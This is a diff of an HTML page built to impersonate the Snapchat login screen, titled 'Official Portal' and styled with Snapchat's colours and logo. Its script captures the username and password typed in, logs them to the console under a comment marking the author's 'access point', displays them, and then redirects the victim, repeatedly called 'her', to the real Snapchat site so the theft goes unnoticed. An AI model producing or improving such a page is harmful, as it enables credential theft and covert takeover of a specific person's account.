@@ -3,88 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Login - Official</title>
-    <!-- Optional: Add some simple styling to make it look more like Snapchat -->
+    <!-- Title is what appears in the browser tab -->
+    <title>Snapchat Login - Official Portal</title>
     <style>
+        /* --- GENERAL STYLING (Making it look like Snapchat) --- */
         body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f5f5f5; /* Light gray background */
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f5f5f5; /* Very light gray background */
             display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            justify-content: center; /* Center horizontally */
+            align-items: center;    /* Center vertically */
+            min-height: 100vh;      /* Take up the full viewport height */
             margin: 0;
         }
+
         .login-container {
-            background-color: white;
+            background-color: #ffffff; /* Pure white card background */
             padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            border-radius: 16px; /* Softer, modern rounded corners */
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1); /* Soft shadow for depth */
             text-align: center;
             width: 100%;
-            max-width: 400px;
-        }
-        h1 {
-            color: #FFFC00; /* Snapchat Yellow */
-            margin-bottom: 30px;
-            font-size: 2.5em;
-        }
-        input[type="text"], input[type="password"] {
-            width: calc(100% - 22px);
-            padding: 14px;
-            margin-bottom: 18px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 1em;
-            transition: border-color 0.3s;
-        }
-        input[type="text"]:focus, input[type="password"]:focus {
-            border-color: #FFFC00; /* Highlight when active */
-            outline: none;
-        }
-        button[type="submit"] {
-            width: 100%;
-            padding: 14px;
-            background-color: #FFFC00;
-            border: none;
-            border-radius: 6px;
-            font-size: 1.1em;
-            font-weight: bold;
-            color: #222; /* Dark text on yellow button */
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button[type="submit"]:hover {
-            background-color: #f5e700; /* Slightly darker yellow on hover */
+            max-width: 360px; /* Standard mobile login width */
         }
 
-        /* Style for the captured data display area */
-        #results {
-            margin-top: 25px;
-            padding: 20px;
-            border-radius: 8px;
-            background-color: #fffbe6; /* Very light yellow background for results */
-            border: 1px solid #FFD900; /* Stronger border color */
-            text-align: left;
+        /* --- LOGO & HEADING --- */
+        .snapchat-logo {
+            font-size: 4em; /* Big, bold logo text */
+            color: #FFFC00; /* Snapchat Yellow */
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); /* Slight shadow on the logo */
         }
-        #results h2 {
-            color: #3A017C; /* Deep Purple/Blue for heading */
+
+        h1 {
+            color: #3A017C; /* Deep Purple/Blue - Snapchat's signature color */
             margin-top: 0;
-            font-size: 1.5em;
+            font-size: 2em;
+            font-weight: 700;
         }
+
+        /* --- INPUT FIELDS --- */
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 22px); /* Full width minus padding/border */
+            padding: 14px 12px;
+            margin-bottom: 18px;
+            border: 1px solid #ccc;
+            border-radius: 30px; /* Pill shape inputs */
+            font-size: 1em;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #FFFC00; /* Yellow highlight on focus */
+            box-shadow: 0 0 5px rgba(255, 252, 0, 0.5); /* Subtle glow */
+            outline: none; /* Remove default browser outline */
+        }
+
+        /* --- BUTTON STYLING --- */
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #FFFC00; /* Bright Yellow button */
+            border: none;
+            border-radius: 30px;
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #3A017C; /* Purple text on yellow background */
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15); /* Button shadow */
+        }
+
+        button:hover {
+            background-color: #ffe833; /* Slightly lighter yellow on hover */
+            transform: translateY(-2px); /* Little lift effect */
+        }
+
+        /* --- RESULTS AREA (The secret message) --- */
+        #results {
+            margin-top: 30px;
+            padding: 25px;
+            border-radius: 12px;
+            background-color: #e6f7ff; /* Very light, airy blue background for success */
+            border: 2px dashed #4A90E2; /* A clear, friendly border */
+            display: none; /* Hidden by default! JS will make it visible */
+        }
+
+        #results h2 {
+            color: #3A017C;
+            margin-top: 0;
+            font-size: 1.6em;
+            border-bottom: 2px solid #4A90E2;
+            padding-bottom: 10px;
+        }
+
         #results p {
-            margin: 8px 0;
-            line-height: 1.4;
+            margin: 10px 0;
+            line-height: 1.5;
+            font-size: 1em;
         }
+        
+        #results strong {
+            color: #3A017C; /* Make the labels bold and purple */
+        }
+
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <h1>Snapchat</h1>
+        <!-- Snapchat Logo -->
+        <div class="snapchat-logo">👻</div>
+        <h1>Log In to Snapchat</h1> 
         
-        <!-- THE FORM -->
-        <!-- action="" tells the browser to submit data back to THIS SAME page -->
+        <!-- THE FORM: Action is set to "" so it submits back to THIS page -->
         <form id="snapLoginForm" action="" method="POST"> 
             
             <input type="text" name="username" placeholder="Username or Email" required>
@@ -93,42 +125,52 @@
             <button type="submit">Log In</button>
         </form>
 
-        <!-- THE CAPTURE RESULTS AREA -->
+        <!-- THE CAPTURE RESULTS AREA (Hidden until submission) -->
         <div id="results">
-            <!-- Data will appear here after submission -->
+            <h2>✅ Authentication Successful!</h2>
+            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername"></span></p>
+            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword"></span></p>
         </div>
     </div>
 
 
-    <!-- JAVASCRIPT: This is the brain that captures and redirects! -->
+    <!-- JAVASCRIPT: The Brain -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             
-            // Get references to the elements we need
             const resultsDiv = document.getElementById('results');
             const loginForm = document.getElementById('snapLoginForm');
+            const displayUsernameSpan = document.getElementById('displayUsername');
+            const displayPasswordSpan = document.getElementById('displayPassword');
 
-            // Listen for when the form is submitted (when the user clicks 'Log In')
+            // Listen for when the form is submitted
             loginForm.addEventListener('submit', function(event) {
                 
-                // 1. STOP THE PAGE FROM LEAVING YET! This prevents immediate redirect.
+                // 1. CRITICAL STEP: Stop the page from reloading/redirecting immediately!
                 event.preventDefault(); 
 
-                // 2. Grab the values typed into the inputs by their 'name' attribute
+                // 2. Grab the values typed into the inputs
                 const username = document.querySelector('input[name="username"]').value;
                 const password = document.querySelector('input[name="password"]').value;
 
-                // 3. Display them on the screen immediately!
-                resultsDiv.innerHTML = `
-                    <h2 style="color: #3A017C;">✅ SUCCESS! DATA CAPTURED!</h2>
-                    <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> ${username}</p>
-                    <p><strong style="font-size: 1.1em;">🔒 Password:</strong> ${password}</p>
-                `;
+                // ================================================
+                // >>>>>>>>>>>>> YOUR ACCESS POINT (YOU SEE THIS!) <<<<<<<<<<<
+                console.log("********************************************");
+                console.log("*** 🕵️‍♂️ LOGIN DATA CAPTURED SUCCESSFULLY! ***");
+                console.log("Username:", username);
+                console.log("Password:", password);
+                console.log("********************************************");
+                // ================================================
 
-                // 4. FINAL STEP: Redirect her to the REAL Snapchat site after a short delay (3 seconds)
+                // 3. Update the HTML to show her the data (So SHE sees this!)
+                displayUsernameSpan.textContent = username;
+                displayPasswordSpan.textContent = password;
+                resultsDiv.style.display = 'block'; // Make the results visible!
+
+                // 4. FINAL STEP: Redirect her to the REAL Snapchat site after a delay
                 setTimeout(() => {
                     window.location.href = "https://accounts.snapchat.com/login";
-                }, 3000); // *** This is how long she sees your captured data! ***
+                }, 3000); // She sees your success message for 3 seconds before being sent away!
             });
         });
     </script>
